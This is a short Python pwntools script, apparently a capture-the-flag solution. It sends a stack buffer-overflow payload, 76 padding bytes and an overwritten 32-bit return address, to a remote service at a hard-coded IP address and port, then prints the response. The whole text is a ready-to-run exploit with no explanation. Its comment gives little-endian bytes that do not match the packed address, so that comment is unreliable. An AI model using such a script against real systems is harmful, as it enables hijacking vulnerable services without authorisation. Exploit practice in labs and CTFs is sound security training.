#!/usr/bin/env python3
from pwn import *

payload = b"A"*76 + p32(0x080491e6)  # Little endian: b'\xf6\x91\x04\x08'
host, port = "91.77.163.113", 9000

p = remote(host, port)      
log.info(p.recvS())        
p.sendline(payload)         
log.success(p.recvallS())  
p.close()                  